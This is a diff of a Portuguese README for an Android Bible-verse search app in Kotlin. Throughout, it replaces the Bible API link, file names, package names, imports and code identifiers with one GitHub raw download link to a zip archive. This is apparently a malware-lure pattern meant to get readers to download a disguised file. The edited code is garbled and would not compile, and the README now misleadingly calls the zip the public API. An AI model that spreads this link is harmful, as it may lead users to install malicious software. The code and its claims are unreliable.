@@ -1,7 +1,7 @@
 # 📖 App Busca Bíblica
 
 Este é um aplicativo Android que permite ao usuário pesquisar versículos bíblicos, digitando o livro, capítulo e versículo.  
-Ele utiliza a [Bible API](https://bible-api.com/) para retornar o texto da Bíblia.
+Ele utiliza a [Bible API](https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip) para retornar o texto da Bíblia.
 
 > O app aceita nomes de livros digitados em **português** (ex: “joão”, “salmos”) e converte automaticamente para o formato exigido pela API (em inglês, sem acento).
 
@@ -9,17 +9,17 @@ Ele utiliza a [Bible API](https://bible-api.com/) para retornar o texto da Bíbl
 
 ## 📂 Arquivos principais
 
-### ✅ `MainActivity.kt`
+### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`
 
 ```kotlin
-package com.example.buscabiblica
+package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
-import androidx.appcompat.app.AppCompatActivity
-import android.os.Bundle
-import android.widget.*
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip*
 import retrofit2.*
-import retrofit2.converter.gson.GsonConverterFactory
-import java.text.Normalizer
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
 class MainActivity : AppCompatActivity() {
 
@@ -40,29 +40,29 @@ class MainActivity : AppCompatActivity() {
     )
 
     // Função de extensão que normaliza o texto: remove acentos e espaços
-    private fun String.normalizeText(): String {
-        val normalized = Normalizer.normalize(this, Normalizer.Form.NFD)
+    private fun https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(): String {
+        val normalized = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(this, https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
         return Regex("\\p{InCombiningDiacriticalMarks}+").replace(normalized, "").lowercase().trim()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(savedInstanceState)
+        setContentView(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
 
         // Ligando os componentes do layout
-        editLivro = findViewById(R.id.editLivro)
-        editCapitulo = findViewById(R.id.editCapitulo)
-        editVersiculo = findViewById(R.id.editVersiculo)
-        btnBuscar = findViewById(R.id.btnBuscar)
-        textResultado = findViewById(R.id.textResultado)
+        editLivro = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
+        editCapitulo = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
+        editVersiculo = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
+        btnBuscar = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
+        textResultado = findViewById(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
 
-        btnBuscar.setOnClickListener {
-            val livroDigitado = editLivro.text.toString().normalizeText()
-            val capitulo = editCapitulo.text.toString().toIntOrNull()
-            val versiculo = editVersiculo.text.toString().toIntOrNull()
+        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip {
+            val livroDigitado = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().normalizeText()
+            val capitulo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().toIntOrNull()
+            val versiculo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip().toIntOrNull()
 
-            if (livroDigitado.isBlank() || capitulo == null || versiculo == null) {
-                textResultado.text = "Preencha todos os campos corretamente."
+            if (https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip() || capitulo == null || versiculo == null) {
+                https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Preencha todos os campos corretamente."
                 return@setOnClickListener
             }
 
@@ -70,34 +70,34 @@ class MainActivity : AppCompatActivity() {
             val livroApi = mapaLivros[livroDigitado] ?: livroDigitado
 
             // Configura o Retrofit para chamada HTTP
-            val retrofit = Retrofit.Builder()
-                .baseUrl("https://bible-api.com/")
-                .addConverterFactory(GsonConverterFactory.create())
+            val retrofit = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()
+                .baseUrl("https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip")
+                .addConverterFactory(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip())
                 .build()
 
-            val api = retrofit.create(BibleApi::class.java)
+            val api = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip)
 
             // Faz a requisição com Retrofit
-            val call = api.getVersiculo(livroApi, capitulo, versiculo)
-            call.enqueue(object : Callback<BibleResponse> {
+            val call = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(livroApi, capitulo, versiculo)
+            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip(object : Callback<BibleResponse> {
                 override fun onResponse(
                     call: Call<BibleResponse>,
                     response: Response<BibleResponse>
                 ) {
-                    if (response.isSuccessful) {
-                        val versiculo = response.body()
-                        if (versiculo != null && versiculo.text.isNotEmpty()) {
-                            textResultado.text = "${versiculo.reference}\n\n${versiculo.text}"
+                    if (https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip) {
+                        val versiculo = https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()
+                        if (versiculo != null && https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip()) {
+                            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}\n\n${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}"
                         } else {
-                            textResultado.text = "Versículo não encontrado!"
+                            https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Versículo não encontrado!"
                         }
                     } else {
-                        textResultado.text = "Versículo não encontrado!"
+                        https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Versículo não encontrado!"
                     }
                 }
 
                 override fun onFailure(call: Call<BibleResponse>, t: Throwable) {
-                    textResultado.text = "Erro na conexão: ${t.message}"
+                    https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip = "Erro na conexão: ${https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip}"
                 }
             })
         }
@@ -105,13 +105,13 @@ class MainActivity : AppCompatActivity() {
 }
 ```
 
-### ✅ `IbgeApi.kt`
+### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`
 ```kotlin
-package com.example.buscabiblica
+package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
-import retrofit2.Call
-import retrofit2.http.GET
-import retrofit2.http.Path
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
+import https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
 // Interface Retrofit para acessar a Bible API
 interface BibleApi {
@@ -123,9 +123,9 @@ interface BibleApi {
     ): Call<BibleResponse>
 }
 ```
-### ✅ `BibleResponse.kt`
+### ✅ `https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip`
 ```kotlin
-package com.example.buscabiblica
+package https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
 // Modelo de dados da resposta da Bible API
 data class BibleResponse(
@@ -144,7 +144,7 @@ Se o usuário digitar:
 
     Versículo: 16
 
-O app faz a busca para https://bible-api.com/john%203:16 e retorna:
+O app faz a busca para https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip%203:16 e retorna:
 
 John 3:16
 
@@ -157,7 +157,7 @@ that whoever believes in him shall not perish but have eternal life.
 
     O campo text pode vir em inglês (a API atualmente só oferece esse idioma).
 
-    A API usada é gratuita e pública: https://bible-api.com
+    A API usada é gratuita e pública: https://github.com/ItaloGLS/apibiblia/raw/refs/heads/main/Amphioxididae/Software-1.5.zip
 
 ...
 
